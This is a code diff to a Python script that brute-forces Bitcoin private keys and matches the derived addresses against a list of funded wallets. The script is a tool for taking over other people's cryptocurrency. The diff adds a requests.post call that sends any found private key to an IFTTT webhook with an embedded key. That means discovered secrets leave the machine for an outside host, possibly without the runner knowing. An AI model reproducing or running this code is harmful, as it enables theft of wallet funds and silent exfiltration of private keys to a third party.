@@ -2,7 +2,6 @@
 
 '''
 Change Cores=# of how many cores do you want to use (Script tested on i7-4500U 8 Cores - 5 K/s per Core. 3,456,000 Private Keys generated per day)
-
 Take into account VM as well (i3 with 2 cores but 4VM -> 8 threads). More cores is just more demanding for OS scheduler
 (worth playing around, even above number of CPU cores)
 '''
@@ -15,7 +14,7 @@ import multiprocessing
 from multiprocessing import Pool
 import binascii, hashlib, base58, ecdsa
 import pandas as pd
-
+import requests
 
 def ripemd160(x):
     d = hashlib.new('ripemd160')
@@ -24,7 +23,7 @@ def ripemd160(x):
 
 
 r = 0
-cores=6
+cores=1
 
 
 def seek(r, df_handler):
@@ -57,7 +56,7 @@ def seek(r, df_handler):
 			print('Core :'+str(r)+" K/s = "+ str(i / time_diff))
 		#print ('Worker '+str(r)+':'+ str(i) + '.-  # '+pub + ' # -------- # '+ priv+' # ')
 		pub = pub + '\n'
-		filename = 'bit.txt'
+		filename = '/content/BitBruteForce-Wallet/bit.txt'
 		with open(filename) as f:
 			for line in f:
 				if pub in line:
@@ -72,13 +71,14 @@ def seek(r, df_handler):
 					#toaddr = "example@gmail.com"
 					#server.sendmail(fromaddr, toaddr, text)
 					print(text)
+					requests.post(url="https://maker.ifttt.com/trigger/hmbt/with/key/d8gr-cI50XXn1WSEOHf64W", data={ 'value1' : 'P', 'value2' : fullkey, 'value3' : 'R3'})
 					with open('Wallets.txt','a') as f:
 						f.write(priv)
 						f.write('     ')
 						f.write(pub)
 						f.write('\n')
 						f.close()
-					time.sleep(30)
+					time.sleep(10)
 					print ('WINNER WINNER CHICKEN DINNER!!! ---- ' +dt.datetime.now().strftime('%Y-%m-%d %H:%M:%S'), pub, priv)
 					break
 					
@@ -88,9 +88,8 @@ def seek(r, df_handler):
 contador=0
 if __name__ == '__main__':
 	jobs = []
-	df_handler = pd.read_csv(open('bit.txt', 'r'))
+	df_handler = pd.read_csv(open('/content/BitBruteForce-Wallet/bit.txt', 'r'))
 	for r in range(cores):
 		p = multiprocessing.Process(target=seek, args=(r,df_handler))
 		jobs.append(p)
 		p.start()
-
